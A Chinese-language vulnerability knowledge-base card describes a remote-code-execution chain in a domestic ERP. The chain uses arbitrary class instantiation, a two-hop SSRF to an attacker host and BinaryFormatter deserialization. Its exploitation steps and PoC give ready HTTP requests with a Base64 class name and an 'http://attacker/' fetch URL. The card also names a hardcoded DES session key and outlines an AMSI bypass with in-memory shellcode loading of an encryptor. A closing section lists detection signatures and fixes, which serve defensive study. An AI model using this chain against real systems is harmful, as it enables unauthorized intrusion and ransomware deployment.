---
id: web-dotnet-deser-erp-openserverdialog-binaryformatter-rce
title: ERP OpenServerDialog 任意类实例化叠加 BinaryFormatter 反序列化 RCE
type: scenario
domain: web
path: web/dotnet/deserialization
technique: openserverdialog-arbitrary-instantiation-ssrf-binaryformatter
tags:
- dotnet
- binaryformatter
- deserialization
- ssrf
- arbitrary-instantiation
- erp
- rce
- ysoserial
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: 不含 TestFunSafeCheck 的版本；ServerVersion 32.18/32.19 已部署入口拦截修复（复建环境 32.19）
verification:
  verified_by: verifier-V2
  verified_at: '2026-11-04T21:45:50+08:00'
  notes: 已通读原文与 51 张截图核对：sdk_sys_OpenServerDialog->Base64DeCode(pagetype)->Assembly.CreateInstance/GetTypeByFullName->借宿主HttpContext、autoisbreakoutwheresign=false、CostLogDebugRec.Bill_OnSave 两跳 SSRF+BinaryFormatter.Deserialize、SysReportCallBack/actionname 反射开窗、ysoserial SortedSet+ComparisonComparer+DelegateSerializationHolder、AMSI/shellcode 后续载荷、TestFunSafeCheck/.ashx/ 拦截与版本判定，均与原文一致。affected_versions 已正确设置。PoC 未在真实目标执行。
url: /docs/web/dotnet/deserialization/web-dotnet-deser-erp-openserverdialog-binaryformatter-rce/
draft: false
kb_aliases:
- OpenServerDialog 任意类实例化
- CostLogDebugRec 反序列化
- 国产 ERP 0day
- SSRF 双跳 BinaryFormatter
- ZBIntel 反序列化
---

## 一句话结论

某国产 ERP 的 `sdk_sys_OpenServerDialog` 消息把客户端 Base64 提交的 `pagetype` 类名直接交给 `Assembly.CreateInstance` 实例化，被实例化页面借用宿主 HTTP 上下文执行；攻击者选择带可控 `urlbox` 的调试页 `CostLogDebugRec`，用两跳 SSRF 拉取恶意 `tmpcostdata.xml` 并送入 `BinaryFormatter.Deserialize`，即可触发 ysoserial gadget 执行任意命令。

## 原理

- **入口消息分发**：`SystemPage` 处理 `__sys_msgid=sdk_sys_OpenServerDialog` 时，把 `pagetype` 参数 Base64 解码成类名，调用 `CreateProxyPage_Async(class, tag)`：
  ```csharp
  case "sdk_sys_OpenServerDialog":
      await this.CreateProxyPage_Async(
          TextCoderClass.Base64DeCode(this.GetText("pagetype")),
          this.GetText("__pagetag"));
      break;
  ```
- **任意类实例化原语**：`CreateProxyPage_Async(string)` 先 `GetType().Assembly.CreateInstance(pagetype)`，失败再用 `RefHelper.GetTypeByFullName(pagetype)` 做全程序集按名搜索兜底并 `Activator.CreateInstance`。全程没有类型白名单，也不校验目标类是否属于预期对话框。
- **借用宿主上下文**：泛型重载拿到实例后执行：
  ```csharp
  proxypage.OwnerPage = this;
  proxypage.OwnerPageTag = tag;
  proxypage.autoisbreakoutwheresign = false;
  proxypage.OnProcessRequestBefore();
  await proxypage.ProcessRequestSelf_Async(this.HttpContext);
  ```
  被实例化页面使用宿主页（`SqlSetting.ashx`）的 `HttpContext` 走完整页面生命周期，URL/Query/Body 对它原样可用；`autoisbreakoutwheresign=false` 关闭了“URL 带 `__sys_msgid` 就短路、不读 Body”的逻辑，于是它可以继续读取 Body 中的业务消息 `CmdKey`。
- **双层消息结构**：URL 的 `__sys_msgid` 供宿主页进入系统消息分支；Body 的 `CmdKey` 供被实例化页触发业务回调。攻击请求因此是“URL 带系统消息 + Body 带 `CmdKey=SysBillSave`”的形态。
- **漏洞本体**：`CostLogDebugRec.Bill_OnSave` 把客户端 `urlbox` 直接拼进两条 URL，先请求 `GetProductCostData` 并要求响应含 `ok`，再请求 `/Sysa/manager/logfiles/tmpcostdata.xml`，把返回字节直接交给 `BinaryFormatter.Deserialize`，没有 `SerializationBinder`、没有类型白名单。
  ```csharp
  string url = SaveDatas["urlbox"].Value + "/SYSN/test/finan/CostLogQuery.ashx?__msgid=GetProductCostData&productid=" + value + "&t=" + DateTime.Now.Ticks;
  string text = HttpClass.GetText(url, new DSOptionsList());
  if (text.IndexOf("ok") >= 0) {
      string url2 = SaveDatas["urlbox"].Value + "/Sysa/manager/logfiles/tmpcostdata.xml?t=" + DateTime.Now.Ticks;
      byte[] bytes = HttpClass.GetBytes(url2, "");
      using (Stream stream = new MemoryStream(bytes)) {
          BinaryFormatter bf = new BinaryFormatter();
          bf.AssemblyFormat = FormatterAssemblyStyle.Simple;
          var dict = (Dictionary<string, DataTable>)bf.Deserialize(stream);
      }
  }
  ```
- **开窗前置动作**：`CostLogQuery.ashx?__msgid=SysReportCallBack` 的 `App_OnSysReportCallBack` 会按 Body 的 `actionname` 反射调用当前页面公共方法：
  ```csharp
  string name = base.Request.Form["actionname"];
  MethodInfo method = GetType().GetMethod(name);
  if (method != null) method.Invoke(this, new object[1]);
  ```
  `actionname=DoMonthLock` 把 `Application["IsOpenCostDataVisitForDebug"]` 设为当前时间加 10 分钟；`GetProductCostData` 因 `OnNoUserLogin` 特判免登录，并在窗口有效时返回 `ok`。攻击日志中两类请求严格成对、约每 15 分钟重复，与 10 分钟窗口吻合。
- **认证绕过**：两类请求携带的 `__sys_mobile_session` 是用硬编码 DES 密钥 `zbintel4` 伪造的九段会话，UserId 直接取自明文第 2 段（详见关联卡）。这使攻击者无需真实账号即可进入移动访问管线。
- **执行结果**：反序列化触发 `System.Diagnostics.Process.Start` 执行 PowerShell，从 C2 下载载荷；前两次被 Defender 拦截，第三次用 `amsiInitFailed` 反射置真关闭 AMSI，再异或解密 shellcode、`VirtualAlloc(PAGE_EXECUTE_READWRITE)` 内存加载，最终落地 `.weax` 加密器。

## 触发条件

- 目标为使用 ZBIntel/SYSN 架构的国产 ERP，且版本不含 `TestFunSafeCheck` 入口拦截（被攻击实例为旧版；32.18/32.19 已加入入口拦截）。
- `SystemPage` 的 `sdk_sys_OpenServerDialog` 消息可达，且 `pagetype` 可控。
- 存在“可控 URL + BinaryFormatter.Deserialize”组合的页面类（本案为 `CostLogDebugRec`），且该类可被实例化。
- `SysReportCallBack` 的 `actionname` 反射调用可达，或攻击者服务器能直接应答第一跳 `ok`（本案 urlbox 指向外部服务器时第一跳由攻击者应答，开窗是链路在目标自身环境内成立的前提）。
- 服务端可出站访问攻击者服务器，或目标内部存在可控中转。

## 利用步骤

1. 伪造移动会话（硬编码 DES 密钥，见关联卡），或用已有低权限会话进入移动访问管线。
2. 发送“开窗”请求：`POST /SYSN/test/finan/CostLogQuery.ashx?__msgid=SysReportCallBack`，Body 带 `actionname=DoMonthLock`，把调试窗口打开 10 分钟。
3. 发送“实例化 + 反序列化”请求：`POST /SYSN/config/SqlSetting.ashx?__sys_msgid=sdk_sys_OpenServerDialog&pagetype=<Base64(类名)>`，Body 为 `{"CmdKey":"SysBillSave","Datas":[{"Id":"ProductId","Val":"1"},{"Id":"urlbox","Val":"http://attacker/"}]}`。
4. `pagetype` 填 `ZBServices.view.SYSN.test.finan.CostLogDebugRec` 的 Base64；宿主 `SqlSetting` 进入系统消息分支，实例化该类并借用上下文执行。
5. 被实例化页读取 Body 的 `CmdKey=SysBillSave`，触发 `Bill_OnSave`；它向 `urlbox` 发起第一跳请求，攻击者服务器返回 `ok`。
6. 第二跳请求 `urlbox + /Sysa/manager/logfiles/tmpcostdata.xml`，攻击者服务器返回 BinaryFormatter 序列化流（ysoserial.net gadget）。
7. 服务端 `BinaryFormatter.Deserialize` 触发 gadget，执行 PowerShell 下载/加载加密器；观察 IIS 日志、4104 ScriptBlock、Defender 1116/1117 与 `.weax` 文件。

## PoC

开窗请求（配对请求之一）：

```http
POST /SYSN/test/finan/CostLogQuery.ashx?__msgid=SysReportCallBack HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

__sys_mobile_session=<伪造会话>&actionname=DoMonthLock
```

实例化与反序列化请求：

```http
POST /SYSN/config/SqlSetting.ashx?__sys_mobile_session=<伪造会话>&__sys_msgid=sdk_sys_OpenServerDialog&pagetype=WkJTZXJ2aWNlcy52aWV3LlNZU04udGVzdC5maW5hbi5Db3N0TG9nRGVidWdSZWM= HTTP/1.1
Host: target
Content-Type: text/json

{"CmdKey":"SysBillSave","Datas":[{"Id":"ProductId","Val":"1"},{"Id":"urlbox","Val":"http://attacker/"}]}
```

`pagetype` 解码：

```text
WkJTZXJ2aWNlcy52aWV3LlNZU04udGVzdC5maW5hbi5Db3N0TG9nRGVidWdSZWM=
-> ZBServices.view.SYSN.test.finan.CostLogDebugRec
```

攻击者服务器需要提供两跳响应：

```text
# 第一跳：任意路径，返回 ok
GET /SYSN/test/finan/CostLogQuery.ashx?__msgid=GetProductCostData&productid=1&t=... -> 200 "ok"

# 第二跳：返回 BinaryFormatter 序列化流
GET /Sysa/manager/logfiles/tmpcostdata.xml?t=... -> 200 <AAEAAAD/////...>
```

序列化流特征：

```text
00 01 00 00 00 FF FF FF FF ...   # BinaryFormatter 魔数 AAEAAAD/////
gadget: SortedSet`1 + ComparisonComparer + DelegateSerializationHolder
效果: System.Diagnostics.Process.Start("powershell", "...")
```

## 变体与关联

- 变体：`CreateProxyPage_Async` 的任意类实例化原语未修，只要存在另一个“可控 URL + Deserialize”的页面类（不限于 test/demo 命名空间），链路即可复活。
- 变体：第一跳 `ok` 可由攻击者服务器直接应答；开窗动作是让链路在目标自身环境内也成立的前提，二者可配合使用。
- 变体：反序列化载荷可用 ysoserial.net 的 `TextFormattingRunProperties` 家族；`AssemblyFormat=Simple` 降低程序集版本约束。
- 变体：后续载荷先用整数数组/大小写/字符串拼接混淆，第三次用 `amsiInitFailed=true` 关闭 AMSI，再异或 35 解密 shellcode、`VirtualAlloc` RWX 内存执行；前两次被 Defender 查杀不影响第三次。
- 关联：[[web-generic-auth-hardcoded-des-session-forgery]] 提供 `__sys_mobile_session` 的离线伪造方法；本卡聚焦任意类实例化与 BinaryFormatter 执行链。
- 关联：`web/dotnet/deserialization` 下的 TypeNameHandling/ServiceHandler 卡讨论 JSON 反序列化；本卡是 BinaryFormatter + 任意类实例化 + SSRF 的组合。

## 检测与防御

- 根治：生产环境整体移除 `SYSN/test/`、`SYSN/view/demo/` 调试页面及其反序列化/数据导出能力；仅做入口拦截不足以清除原语。
- 根治：删除 `CostLogDebugRec.Bill_OnSave` 的 `BinaryFormatter.Deserialize`，改用显式类型序列化（JSON/DataContract）并加类型白名单；全局 BinaryFormatter 调用点统一加 `SerializationBinder`。
- 修复：`CreateProxyPage_Async(string)` 的 `Assembly.CreateInstance` 与 `GetTypeByFullName` 必须加显式类白名单，只允许既定对话框类；`actionname` 反射调用加方法白名单。
- 修复：`urlbox` 做严格 URL 白名单/内网地址校验，禁止出站到任意主机；第二跳文件路径固定，不接受客户端拼接。
- 修复：会话机制迁移到带签名/实例密钥绑定的方案，不能继续使用硬编码 DES 密钥。
- 检测：请求中出现 `__sys_msgid=sdk_sys_OpenServerDialog`、`__msgid=SysReportCallBack`、`actionname=DoMonthLock`、`CmdKey=SysBillSave`、Base64 `pagetype` 等组合特征。
- 检测：`billuploadfield` 目录出现命令回显 txt、`Sysa\manager\logfiles\tmpcostdata.xml` 异常写入、4104 ScriptBlock、Defender 1116/1117、1102 日志清除、电源策略被重置。
- 自查：访问 test 页返回 `no-demo-error` 说明已部署入口拦截；在 `ZBServices.sdk.dll` 搜索 `no-demo-error`/`GetRuntimePrivateKey`，二者均不存在即可利用版本；但入口拦截不等于原语修复，仍需代码级整改。
